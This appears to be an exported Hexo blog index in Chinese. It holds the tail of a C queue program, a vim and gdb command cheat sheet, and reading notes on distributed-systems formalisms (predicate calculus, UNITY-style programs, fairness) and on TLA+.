class="keyword">if</span> (q2[a[now]] == q1[a[now]])<span class="comment">//判断第a[now]的队列是否为空</span></span><br><span class="line">                    q[++q1l] = a[now];<span class="comment">//为空的话这里入队</span></span><br><span class="line">                b[a[now]][++q1[a[now]]] = now;<span class="comment">//此时的编号入队</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                q2[q[q2l]]++;<span class="comment">//q2l记录当前的队头在q中的编号，则q[q2l]队的队头自增</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, b[q[q2l]][q2[q[q2l]]]);</span><br><span class="line">                <span class="keyword">if</span> (q2[q[q2l]] == q1[q[q2l]])<span class="comment">//如果这里为空的话就可以看q中的下一个了</span></span><br><span class="line">                    q2l++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="comment">//end of while(cmd)</span></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;t);</span><br><span class="line">    &#125; <span class="comment">//end of big while(t)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>数据结构</category>
        <category>线性表</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>线性表</tag>
      </tags>
  </entry>
  <entry>
    <title>vim+gdb</title>
    <url>/2022/03/12/vim-gdb/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​    前段时间买了个平板，一直想着找到一个在平板上写代码的方法，最开始以为的最优解是使用vscode-online，后来配置好了之后发现vscode-online缺少了几个写C++的关键插件，只能当作一个文本编辑器使用，然后在终端运行，但是并不能调试，也就没什么用了。</p>
<p>​    后来想想还是用iSH连接到服务器使用vim+gdb写代码吧，其实熟悉了之后用起来还是很方便的。但是有些命令不经常使用会忘掉，所以这里就记录一下常用的一些命令。</p>
<p>​    <del>或许想要在平板上写代码本身就是一个很反人类的事情</del></p>
<h1 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h1><p>​    其实就是记录一下vim的简单操作，毕竟平时用的相对没有那么多</p>
<h2 id="一些快捷键"><a href="#一些快捷键" class="headerlink" title="一些快捷键"></a>一些快捷键</h2><ul>
<li>用<code>hjkl</code>四个键分别替代了左下右上的方向键</li>
<li>使用<code>Ctrl+f</code>进行向下翻页，使用<code>Ctrl+b</code>进行向上翻页</li>
<li><code>0</code>移动到这一行最前面，<code>$</code>移动到这一行最后面，<code>G</code>移动到整体的最后一行</li>
<li><code>/word</code>正向搜索，<code>?word</code>反向搜索，这个时候按下<code>n</code>支持向下重复搜索，按下<code>N</code>支持向上重复搜索</li>
<li><code>:%s/word1/word2/gc</code>，从上往下搜索，把word1替换成word2，在替换的时候询问时候替换，如果不需要询问就把gc换成c，如果要指定搜索范围就在这条命令前加用逗号隔开的两个数字</li>
<li><code>x</code>为向后删除一个字符，<code>X</code>为向前删除一个字符</li>
<li><code>dd</code>删除这一行，<code>nyy</code>复制光标行到下面n行，<code>p</code>在下一行贴上，<code>P</code>在上一行贴上</li>
<li><code>u</code>复原上一个操作，<code>Ctrl+r</code>重复上一个操作</li>
</ul>
<h1 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h1><h2 id="启动调试"><a href="#启动调试" class="headerlink" title="启动调试"></a>启动调试</h2><p>​    要想开始调试，需要在编译的时候使用<code>-g</code>参数，然后就可以开启gdb进行调试了，如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -g test.c -o test</span><br><span class="line">gdb test</span><br></pre></td></tr></table></figure>
<p>​    然后这个时候就可以尝试一些比较简单的命令，如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run # 运行程序，简写为r</span><br><span class="line">list # 查看源代码，简写为l，l-n表示从第n行查看，l+函数名表示查看具体函数</span><br><span class="line">quit # 退出gdb，简写为q</span><br></pre></td></tr></table></figure>
<p>​    有时候可能main函数带参数，可以用如下两种方式运行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set args 参数 </span><br><span class="line">run</span><br><span class="line"><span class="meta">#</span><span class="bash"> 上面为方法1</span></span><br><span class="line">run 参数</span><br><span class="line"><span class="meta">#</span><span class="bash"> 上面为方法2</span></span><br></pre></td></tr></table></figure>
<h2 id="断点相关"><a href="#断点相关" class="headerlink" title="断点相关"></a>断点相关</h2><p>​    这部分主要说一些和断点有关的命令，主要常用的设置方式都在下面</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">info breakpoints # 查看目前设置的所有断点</span><br><span class="line">break num # 在某一行设置断点，简写为b，以下都是可以简写成b的</span><br><span class="line">break functionname # 在这个函数处设置断点</span><br><span class="line">break num if &lt;condition&gt; # 当满足某个条件时在num行中断程序</span><br><span class="line">tbreak num # 设置临时断点，这个断点只生效一次</span><br><span class="line">ignore 1 30 # 跳过断点1的前面30次</span><br><span class="line">watch a # 当a发生变化时产生断点</span><br><span class="line">rwatch # 被读时断住</span><br><span class="line">awatch # 被读或者被改写的时候断住</span><br><span class="line">disable # 禁用所有断点</span><br><span class="line">disable bnum # 禁用断点bnum</span><br><span class="line">enable # 和上面的命令对称</span><br></pre></td></tr></table></figure>
<h2 id="查看一些信息"><a href="#查看一些信息" class="headerlink" title="查看一些信息"></a>查看一些信息</h2><h3 id="查看变量"><a href="#查看变量" class="headerlink" title="查看变量"></a>查看变量</h3><p>​    这部分主要是用<code>print</code>命令，简写为<code>p</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">p 变量名 # 直接打印变量名</span><br><span class="line">p &#x27;filename&#x27;::变量名 # 防止一个文件中出现有重名</span><br><span class="line">p *point # 打印指针指向的内容，如果是数组的话只能显示第一个</span><br><span class="line">p *point@10 # 打印前十个</span><br><span class="line"><span class="meta">#</span><span class="bash"> $可以表示上一个变量，比如如果有一个链表，则有如下访问方式</span></span><br><span class="line">p *head</span><br><span class="line">p *$.next # 显示下一个结点的内容</span><br></pre></td></tr></table></figure>
<p>​    另外也可以指定该命令打印出的格式。</p>
<ul>
<li><code>x</code>打印16进制</li>
<li><code>o</code>打印8进制</li>
<li><code>t</code>打印2进制</li>
</ul>
<p>​    主要用法如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">p/x c</span><br></pre></td></tr></table></figure>
<p>​    此外，可以使用<code>examine</code>命令查看内存地址中的值，简写为<code>x</code></p>
<p>​    语法如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">x/[n][f][u] addr</span><br></pre></td></tr></table></figure>
<p>​    其中：</p>
<ul>
<li><code>n</code>表示要显示的内存单元数，默认为1</li>
<li><code>f</code>为要打印的格式，和<code>p</code>一样的</li>
<li><code>u</code>为要打印的单元长度，主要有如下4类<ul>
<li><code>b</code>，字节</li>
<li><code>h</code>，双字节</li>
<li><code>w</code>，四字节</li>
<li><code>g</code>，八字节</li>
</ul>
</li>
</ul>
<p>​    如果希望程序在断住的时候就显示某个变量的值，可以用<code>display</code>命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">display e # 此后程序在断住的时候就会显示e的值</span><br><span class="line">into display # 查看哪些变量被这样设置了</span><br><span class="line">delete display num # 删除</span><br></pre></td></tr></table></figure>
<p>​    另外也有一些很重要的要查看的东西，比如查看寄存器，查看栈帧，查看反汇编，下面一一介绍</p>
<h3 id="查看寄存器"><a href="#查看寄存器" class="headerlink" title="查看寄存器"></a>查看寄存器</h3><p>​    直接使用<code>info registers</code>命令即可。</p>
<h3 id="查看反汇编"><a href="#查看反汇编" class="headerlink" title="查看反汇编"></a>查看反汇编</h3><p>​    直接使用<code>disassemble</code>命令，在这种情况下也可以使用偏移的方式加断点，比如查看反汇编之后会给出一些命令相对于函数入口的偏移地址，那么就可以使用如下命令加断点</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">b *main+x</span><br></pre></td></tr></table></figure>
<p>​    另外也可以打印出源码和反汇编在一块的</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">disassemble /m functionname</span><br></pre></td></tr></table></figure>
<p>​    需要注意的是，gdb打印出来的反汇编是AT&amp;T格式的，要切换成intel格式需要用<code>set disassembly-flavor intel</code>，至于这两种格式的区别可以参考csapp第三章。</p>
<h3 id="查看栈帧"><a href="#查看栈帧" class="headerlink" title="查看栈帧"></a>查看栈帧</h3><p>​    直接使用<code>backtrace</code>命令，简写为bt</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bt # 查看整个调用栈</span><br><span class="line">bt n # 只打印栈顶上n层</span><br><span class="line">bt -n # 只打印栈底下n层</span><br></pre></td></tr></table></figure>
<p>​    如果要查看某一层的信息，应该用<code>frame</code>命令，简写为f，会打印出栈的层编号、当前函数名、参数值、函数所在的文件和行号、函数执行到的语句。使用<code>info frame</code>会打印出更加详细的信息。如果要查看栈里的某个函数的话需要切换当前栈<code>f n</code>表示切换到第n层，<code>up n</code>表示向上移动n层，<code>down n</code>表示向下移动n层</p>
<h2 id="单步调试"><a href="#单步调试" class="headerlink" title="单步调试"></a>单步调试</h2><p>​    这里就和常用的IDE的调试方法一样了，简单记录以下</p>
<ol>
<li>单步执行，<code>next</code>，简记为<code>n</code></li>
<li>单步进入，<code>step</code>，简记为<code>s</code></li>
<li>继续执行，<code>continue</code>，简记为<code>c</code></li>
<li>运行到指定位置，<code>until</code>，简记为<code>u</code>，这个倒是没有见过，就是设置了一个临时断点，运行到指定行就停住</li>
<li>跳过执行，<code>step</code>，在step时跳过一些不想关注的函数</li>
</ol>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>Linux</category>
        <category>C++</category>
        <category>生产力工具</category>
        <category>基本知识</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>Linux</tag>
        <tag>生产力工具</tag>
      </tags>
  </entry>
  <entry>
    <title>《Introduction to distributed systems》阅读笔记（一）</title>
    <url>/2021/09/03/%E3%80%8AIntroduction-to-distributed-systems%E3%80%8B%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<h1 id="总述"><a href="#总述" class="headerlink" title="总述"></a>总述</h1><p>​    从标题上看，这一章应该是对布尔值、谓词和量词等一般概念的讲解，大概和离散数学里学的差不多</p>
<h1 id="初步知识"><a href="#初步知识" class="headerlink" title="初步知识"></a>初步知识</h1><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>​    其实定义什么的都和之前学过的差不多，函数也就是映射，注意一下这里的表示，即如开方函数表示为<em>sqrt : $IR^+ \rightarrow IR^+$</em></p>
<p>​    然后就是函数的一种操作符，即为函数应用符（<strong>function application</strong>），用”.”来表示，比如sqrt.16，事实上我们编程的时候更常见的是sqrt(16)，但是通常选择前者，因为它很适合<strong>Currying</strong>，<del>暂时还不知道是什么东西</del></p>
<p>​    当然如果函数有多个参数的话似乎就不太好表示了，例如$max2 : Z \times Z \rightarrow Z$，将会被写成$max2.(a,b)$</p>
<p>​    点号运算符优先和1左边结合，即$f.x.y$，将会被看成$(f.x).y$，这意味着$f.x$必须是一个函数，用这种方式可以重新定义具有多个参数的函数<del>虽然仔细一想感觉我设计的都比较鸡肋</del></p>
<h2 id="布尔值和谓词"><a href="#布尔值和谓词" class="headerlink" title="布尔值和谓词"></a>布尔值和谓词</h2><p>​    对于布尔值，和之前学过的都差不多，当然就是这些操作可以看作是函数，例如$\bigwedge.true.false$，其值为$false$，但是通常写成中缀形式，即$true\bigwedge false$</p>
<p>​    对于谓词，这里指的是值域为布尔值的函数，可以写成如下通用形式</p>
<script type="math/tex; mode=display">
P : S \rightarrow boolean</script><p>​    其中S是任意的定义域</p>
<p>​    感觉这里说的谓词就像是描述某一种属性一样，即满足条件的为$true$，否则为$false$，也因此我们可以使用韦恩图来可视化谓词</p>
<p>​    在计算机科学中，谓词的域通常是程序的状态空间，缩写出的表达式都是布尔表达式，对于状态空间的点，要么为真要么为假</p>
<h2 id="提升-lifting"><a href="#提升-lifting" class="headerlink" title="提升(lifting)"></a>提升(lifting)</h2><p>​    从现在来看，布尔值和谓词还是有明显区别的，但是如果考虑操作的时候，两者的界限再次模糊。在布尔值上的一些操作都是可以用在谓词上的，他们是不同的操作，但是符号相同，因此有可能产生混淆</p>
<script type="math/tex; mode=display">
\bigwedge : boolean \times boolean \rightarrow boolean\\
\bigwedge : predicate \times predicate \rightarrow \ldots</script><p>​    通常后者得到的是一个函数，并且值域是布尔值</p>
<p>​    通过这种方式，布尔值上的一个运算符被提升为对映射到布尔值的函数进行操作，这种单一符号的重载被称为<strong>提升（lifting）</strong></p>
<p>​    提升也可以应用到常量$true$和$false$，它们可以被提升到谓词，即前者在每处都映射到$true$，而后者在每处都映射到$flase$，接下来我们要界定每处(everywhere)这个概念</p>
<h2 id="Everywhere-Brackets"><a href="#Everywhere-Brackets" class="headerlink" title="Everywhere Brackets"></a>Everywhere Brackets</h2><p>​    <del>有一说一感觉这个感念有些费解</del></p>
<p>​    感觉就像是对于谓词来使用布尔运算符，用中括号括起来，始终恒为真或恒为假，直接得到了一个布尔值，下面给一下例子</p>
<script type="math/tex; mode=display">
(istall = isheavy).xiaoming
\\
[istall = isheavy]</script><h1 id="谓词演算"><a href="#谓词演算" class="headerlink" title="谓词演算"></a>谓词演算</h1><h2 id="Equivalence"><a href="#Equivalence" class="headerlink" title="Equivalence"></a>Equivalence</h2><p>​    $X \equiv Y$意味着两个要么都为真，要么都为假</p>
<p>​    这里之所以不用平常的=是有原因的，因为如果在同一行写多个等于号有着独特的含义，即</p>
<script type="math/tex; mode=display">
sqrt.16 = 4 = 2^2</script><p>​    这称之为chaining，相当于下面这种情况的简写</p>
<script type="math/tex; mode=display">
(sqrt.16=4) \bigwedge (4=2^2)</script><p>​    当然$\equiv$也可以在同一行，但是就没有太多的含义，例如</p>
<script type="math/tex; mode=display">
false \equiv true \equiv false
\\
\rightarrow flase \equiv flase \rightarrow true</script><p>​    但是如果仿照chaining重写的话就会出现问题，这里自己想一下就行了</p>
<p>​    然后就是几条公理</p>
<script type="math/tex; mode=display">
Axiom1.结合律
\\
[((X \equiv Y)\equiv Z) \equiv (X \equiv(Y \equiv Z))]</script><script type="math/tex; mode=display">
Axiom2.交换律\\
[X\equiv Y \equiv Y\equiv X]</script><p>​    当然根据结合律上面的交换律可以随意加括号</p>
<script type="math/tex; mode=display">
Axiom 3.永真律\\
[Y\equiv Y \equiv true]</script><h2 id="Disjunction"><a href="#Disjunction" class="headerlink" title="Disjunction"></a>Disjunction</h2><p>​    其实就是$\bigvee$，然后也有很多的公理，其实感觉就跟之前学的命题等价公式差不多</p>
<script type="math/tex; mode=display">
Axiom4. \bigvee的结合律\\
[X \bigvee (Y \bigvee Z)\equiv(X\bigvee Y)\bigvee Z]</script><script type="math/tex; mode=display">
Axiom5. \bigvee的交换律\\
[X\bigvee Y \equiv Y \bigvee X]</script><script type="math/tex; mode=display">
Axiom6.\bigvee幂等律\\
[X\bigvee X\equiv X]</script><script type="math/tex; mode=display">
Axiom7.\bigvee的分配律\\
[X\bigvee(Y\equiv Z)\equiv(X\bigvee Y)\equiv(X \bigvee Z)]</script><h2 id="证明格式"><a href="#证明格式" class="headerlink" title="证明格式"></a>证明格式</h2><p>​    这些东西感觉和离散数学真的很像，证明的每一步都需要相应的注释，另外就是需要注意的是分行写证明过程和卸载一行的等式是不一样的</p>
<h2 id="连词和暗示"><a href="#连词和暗示" class="headerlink" title="连词和暗示"></a>连词和暗示</h2><p>​    现在考虑仅使用$\equiv$和$\bigvee$并且只有两个或更少变量的表达式，事实上，我们只能写出少量结构不同的最简化的表达式，事实上，只有两个</p>
<p>​    这些表达式的每一个都看一看作对两个变量的操作，我们可以借此引入新的二元运算符</p>
<script type="math/tex; mode=display">
Axiom 8. \bigwedge的定义，也称为黄金律\\
[X \bigvee Y \equiv X\equiv Y \equiv(X\bigwedge Y)]</script><script type="math/tex; mode=display">
Axiom 9. \Rightarrow 的定义
\\
[X\bigvee Y\equiv Y \equiv(X \Rightarrow Y)]</script><p>​    另外我们可以通过规定运算顺序来减少括号的数量，这里和离散数学中是完全一样的，因此不再赘述</p>
<h2 id="否定和错误"><a href="#否定和错误" class="headerlink" title="否定和错误"></a>否定和错误</h2><p>​    其实就是之前的非运算，<del>无奈符号不会敲</del></p>
<p>​    这里的一些公理不再打了<del>（主要是不会打非运算）</del>，和离散数学中学到的差不多</p>
<h2 id="不等于"><a href="#不等于" class="headerlink" title="不等于"></a>不等于</h2><p>​    其实就是个不等于号，但是中间有三条横杠，定义其实就是相等的否定</p>
<script type="math/tex; mode=display">
[(X\equiv(Y\neq Z))\equiv ((X\equiv Y)\neq Z)]</script><p>​    我们甚至可以去掉所有括号，<del>但是感觉好难受哦</del></p>
<h1 id="量化"><a href="#量化" class="headerlink" title="量化"></a>量化</h1><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p>​    看起来量词好像和之前学过的不太一样，这里要讲述的是更为根本的定义，一个量词有着如下的形式</p>
<script type="math/tex; mode=display">
(Qi : r.i:t.i)</script><p>​    其中的Q是操作，i是绑定变量，r.i是范围，t.i是方式，为了成为一个有效的量词，这些元素需要满足以下条件</p>
<ol>
<li>操作必须是具有单位元素的二元对称关联运算符</li>
<li>范围必须是绑定变量i的谓词</li>
<li>方式必须是一个表达式，并且类型一定要和运算符的操作数类型相同</li>
</ol>
<p>​    因此，对于绑定变量的类型$T$，范围是$T$的谓词，条件是一些类型$D$的表达式</p>
<h2 id="Informal-Interpretation"><a href="#Informal-Interpretation" class="headerlink" title="Informal Interpretation"></a>Informal Interpretation</h2><p>​    这节貌似是用非正式的方式解释了一下上面说的量词的含义。</p>
<p>​    我们容易知道r.i指的是i的取值范围，那么我们可以将上述式子转化成下面的写法</p>
<script type="math/tex; mode=display">
u Q t.i_0Qt.i_1Q\dots Q t.i_N</script><p>​    其中u是Q的单位元素</p>
<p>​    下面是一些比较常用的量词和对应的操作符</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">Operator</th>
<th style="text-align:center">Quantification Symbol</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">$\bigwedge$</td>
<td style="text-align:center">$\forall$</td>
</tr>
<tr>
<td style="text-align:center">$\bigvee$</td>
<td style="text-align:center">$\exists$</td>
</tr>
<tr>
<td style="text-align:center">$+$</td>
<td style="text-align:center">$\sum$</td>
</tr>
<tr>
<td style="text-align:center">$\times$</td>
<td style="text-align:center">$\prod$</td>
</tr>
</tbody>
</table>
</div>
<p>​    当然使用以上 i的规则可以写出更多的量词，例如</p>
<script type="math/tex; mode=display">
1. (\bigcup i:i\in Z \bigwedge even.i:{i})\\
2.(Min n:n \in N \bigwedge even.n:(n-3)^2)</script><p>​    另外就是对于绑定变量的类型通常是有约定的，例如$i$通常用作在整数上的绑定变量，而n通常被认为是自然数，因此上面的是可以再度简化的</p>
<p>​    另外就是在范围谓词为真是是可以被直接忽略的，例如</p>
<script type="math/tex; mode=display">
(\forall i::i^2>0)</script><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>​    书中最开始给出了一个这样的例子，即如何理解$\prod_{i=4}^1i$，现在可以通过刚刚学到的定义进行解决，即中间的范围谓词的值恒为假，我们有如下公理</p>
<script type="math/tex; mode=display">
(Qi:false:t.i)=u</script><p>​    所以现在需要明确的就是量词的单位元，但是问题在于一些量词可能不是很容易找出单位元，这里的单位元的含义就是找到一个$u$使得对$\forall x$均有$uQx =x$，也就是说，比如对于Min操作的单位元，或许就是$+\infty$</p>
<script type="math/tex; mode=display">
(Qi:i=E:t.i)=t.E</script><p>​    现在我们对于量化仅仅只是一个非正式的理解，要进行完整的定义需要更多的公式，此处不再继续深入</p>
]]></content>
      <categories>
        <category>分布式系统</category>
        <category>Introduction to distributed systems</category>
      </categories>
      <tags>
        <tag>分布式系统</tag>
      </tags>
  </entry>
  <entry>
    <title>《Introduction to distributed systems》阅读笔记（二）</title>
    <url>/2021/09/04/%E3%80%8AIntroduction-to-distributed-systems%E3%80%8B%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    <content><![CDATA[<h1 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h1><p>​    程序由两部分组成，即有类型的变量的集合，以及任务的有限集，后者又通常被称为行为（<strong>action</strong>）</p>
<p>​    注意到这里说的是任务的集合，这意味着任务是<strong>无序的</strong>，变量在最开始用关键字<strong>var</strong>来声明，任务在下一个部分被列出，用关键字<strong>assign</strong>来声明，任务之间用[]隔开，<del>其实或许应该用一个fatbar，但是我不会打</del></p>
<p>​    下面给一个简单地例子</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Program Trivial</span><br><span class="line">var		x,y: int</span><br><span class="line">assign</span><br><span class="line">	x := 2</span><br><span class="line">  [] y := f.7</span><br></pre></td></tr></table></figure>
<p>​    如果类型容易从上下文中看出，那么可以省略</p>
<p>​    值得一提的是，所有程序的assignments都是非空的，即使没有，也默认执行了一个<strong>skip</strong>动作</p>
<p>​    另外，程序也有可能包含一些初始条件，用关键字<strong>initially</strong>声明“initially section”，这部分会声明在变量后面，在任务前面，注意初始化部分是程序的变量的谓词</p>
<h1 id="Actions"><a href="#Actions" class="headerlink" title="Actions"></a>Actions</h1><h2 id="简单指派"><a href="#简单指派" class="headerlink" title="简单指派"></a>简单指派</h2><p>​    每个行为最终都必须结束，但是分类到的内容是不确定的，例如$x := rand(1,10)$</p>
<p>​    这给x随机分配了1到10中的任意一个整数</p>
<p>​    行为必须对每一个状态都能被定义，这就要考虑某些变量的取值让整个表达式无意义的情况，例如$x:=x/y$</p>
<p>​    这个表达式在$y=0$的时候无意义</p>
<h2 id="多元指派"><a href="#多元指派" class="headerlink" title="多元指派"></a>多元指派</h2><p>​    在单一行为中可以存在多元的指派，有两种写法，第一种如下，也更加精悍$x,y := 2,f.3$</p>
<p>​    这个行为是这样运作的，即首先计算等式右边的所有的表达式，然后一一指派给左边，所以可以用如下的一个表达式来进行变量值的交换$x,y := y,x$</p>
<p>​    第二种表达就显得冗长一些，但是有助于量化，可以用||运算符来分隔多个赋值，即$x := y || y:=x$</p>
<h2 id="受制行为（Guarded-Actions）"><a href="#受制行为（Guarded-Actions）" class="headerlink" title="受制行为（Guarded Actions）"></a>受制行为（Guarded Actions）</h2><p>​    就像是条件语句吧，后面的要想发生前面的必须为真，前面的称之为**guard，如$x&gt;0\rightarrow x,y :=2,f.3$</p>
<p>​    其中的guard是程序状态空间中的一个谓词，如果guard在某些状态下为真，该行为在那个状态下就被称为可满足的</p>
<h2 id="顺序组合"><a href="#顺序组合" class="headerlink" title="顺序组合"></a>顺序组合</h2><p>​    我们现在要使用一个显式的程序计数器来模拟程序的顺序执行，并且用上面的Guarded Actions来模拟顺序执行，如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Program SequentialSwap</span><br><span class="line">var x, y, temp : int,</span><br><span class="line">	pc : nat</span><br><span class="line">initially pc = 1</span><br><span class="line">assign</span><br><span class="line">	pc = 1 −→ temp, pc := x, 2</span><br><span class="line">	[] pc = 2 −→ x, pc := y, 3</span><br><span class="line">	[] pc = 3 −→ y, pc := temp, 4</span><br></pre></td></tr></table></figure>
<h1 id="Operational-Intuition"><a href="#Operational-Intuition" class="headerlink" title="Operational Intuition"></a>Operational Intuition</h1><h2 id="程序执行"><a href="#程序执行" class="headerlink" title="程序执行"></a>程序执行</h2><p>​    这部分说的好像是，虽然我们可以使用断言来检查程序算法，但是我们仍然需要对程序执行的一种非正式的操作直觉</p>
<p>​    程序执行是这样的，即在满足初始谓词的任何状态下开始，通过随机的选择并执行程序动作集中的动作，完成后继续重复上面的操作，并且是无限的，可以认为是抽取后再放回，这些选择本身就是随机的，几乎不受任何限制，但是有一种叫做<strong>fairness</strong>的限制，这会在以后详细讨论</p>
<h2 id="终止"><a href="#终止" class="headerlink" title="终止"></a>终止</h2><p>​    非确定的行为选择是没有尽头的，下面考察这样一个程序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Program Boring</span><br><span class="line">initially x = 2 ∧ y = f.7</span><br><span class="line">assign</span><br><span class="line">	   x := 2</span><br><span class="line">	[] y := f.7</span><br></pre></td></tr></table></figure>
<p>​    很显然无论选择哪一个行为，整个程序的状态都不会有任何的变化，这意味着整个程序的状态保持稳定，计算可以被视为完成，所以很显然，我们所认为的程序的终止是指的程序最终到达了一个不动点（<strong>fixed point</strong>），简称<strong>FP</strong>，注意到FP是一个谓词，表示程序处于固定点的状态，给出一个计算FP的范式，即将每个赋值改成相等，但后取谓词结果集的合取</p>
<h2 id="例子：求最大值"><a href="#例子：求最大值" class="headerlink" title="例子：求最大值"></a>例子：求最大值</h2><p>​    事实上在我们以往所用到的顺序编程语言中，我们需要一个循环来找到最大值，但是在这里我们没有循序组合，更没有迭代，但是可以通过以下更简单的方式来实现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Program	FindMax</span><br><span class="line">var A:array 0..N-1 of int,</span><br><span class="line">	result:int</span><br><span class="line">initially result = A[0]</span><br><span class="line">assign</span><br><span class="line">	([]x : 0&lt;=x&lt;=N-1 : result:=max(result,A[x]))</span><br></pre></td></tr></table></figure>
<h1 id="程序可视化"><a href="#程序可视化" class="headerlink" title="程序可视化"></a>程序可视化</h1><h2 id="有向图"><a href="#有向图" class="headerlink" title="有向图"></a>有向图</h2><p>​    这里主要谈论一种有助于增加对程序直觉性的方法，即画图辅助</p>
<p>​    首先，再程序状态空间中的每一个状态可以被看做结点，每一个行为可以看作有向边，然后就是有以下几个约定</p>
<ol>
<li>所有程序都包含skip，这意味着所有有向图都具有自回路</li>
<li>所有的行为都是<strong>total</strong>，这意味着所有结点度不为0</li>
</ol>
<h2 id="一个练习"><a href="#一个练习" class="headerlink" title="一个练习"></a>一个练习</h2><p>​    略</p>
<h1 id="公平（Fairness）"><a href="#公平（Fairness）" class="headerlink" title="公平（Fairness）"></a>公平（Fairness）</h1><h2 id="动机（Motivation）"><a href="#动机（Motivation）" class="headerlink" title="动机（Motivation）"></a>动机（Motivation）</h2><p>​    我们注意到，每个程序都必然隐含着一个跳过的步骤，而每个程序都包含了多个步骤，按照之前的理论，我们每次都要选择一个动作，那么必然就会有一种不走运的情况，即每次都选择了跳过动作。为了避免这种情况，我们对动作的选择增加了公平的要求，这里主要分为强公平和弱公平</p>
<h2 id="弱公平"><a href="#弱公平" class="headerlink" title="弱公平"></a>弱公平</h2><p>​    在弱公平性的条件下，每个动作都保证被无限频繁的选择，这意味着在选择两个特别的相同的行为时，中间有有限数量的其他的行为被选择，这样的一种条件对效率没有保证，而且有可能程序不会达到不动点</p>
<h2 id="强公平-标记，有疑问"><a href="#强公平-标记，有疑问" class="headerlink" title="强公平**标记，有疑问"></a>强公平**标记，有疑问</h2><p>​    根据之前的假想，需要有一种更强的公平。弱公平主要是用来阻止一些“恶意”的选择</p>
<p>​    强公平要求每个动作都被无限频繁的选择，此外，如果一个动作被无限频繁的启用，那么他会被无限频繁的选择，<del>感觉这里不是很理解</del></p>
<p>​    在StackOverflow中查了一下（不得不说里面大佬真多），强公平性大概指的就是没有动作可以无限的启用而不被执行</p>
]]></content>
      <categories>
        <category>分布式系统</category>
        <category>Introduction to distributed systems</category>
      </categories>
      <tags>
        <tag>分布式系统</tag>
      </tags>
  </entry>
  <entry>
    <title>《Practical TLA+》阅读笔记（一）</title>
    <url>/2021/08/23/%E3%80%8APractical-TLA+%E3%80%8B%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<h1 id="简要介绍"><a href="#简要介绍" class="headerlink" title="简要介绍"></a>简要介绍</h1><p>​    在编程过程中，有可能代码出现了问题，我们可以通过传统的调试方法解决，但是如果是我们的设计出了问题，我们往往没有那么容易去进行调试。</p>
<p>​    这样的错误叫做<strong>“specification errors”</strong>，我们可以用一些特殊的语言去找到这种错误，比如<strong>“TLA+”</strong>。我们是通过TLA+的符号来对系统进行检验，它可以推演系统接下来的改变。</p>
<p>​    TLA+不需要编译，他需要被核查，这里用到了<strong>TLC</strong>，TLC将已有的模型分成了11条时间线，并且逐一去核实</p>
<h1 id="CHAPTER-1"><a href="#CHAPTER-1" class="headerlink" title="CHAPTER 1"></a>CHAPTER 1</h1><h2 id="第一个例子"><a href="#第一个例子" class="headerlink" title="第一个例子"></a>第一个例子</h2><h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><p>​    两个人在银行有账户，每个账户中有0￥或更多￥，现在这个银行想要添加“电汇”功能，可以相互转账。要求如下：</p>
<pre><code> 1. 每条电汇必须在银行中的两个不同账户间进行，至少一美元
 2. 成功的话从发送方中扣除并添加到接收方
 3. 失败的话两个账户不变
 4. 电汇可能不会导致出现账户负值
 5. 多条线路可能同时发生
</code></pre><p>​    算法应满足以上所有要求</p>
<h3 id="解决样例"><a href="#解决样例" class="headerlink" title="解决样例"></a>解决样例</h3><p>​    要使用TLA+，首先需要创建新的文件，即<strong>File-&gt;Open Spec-&gt;Add New Spec</strong></p>
<p>​    然后我们需要保证模块名称和文件名称匹配，否则会报错。TLC    默认只识别最上方横线和最下方双横线之间的内容</p>
<p>​    接下来是一个比较重要的TLA+的关键字，即<strong>EXTENDS</strong>，由于在这个场景中我们需要进行数字运算，所以导入<strong>Integers</strong></p>
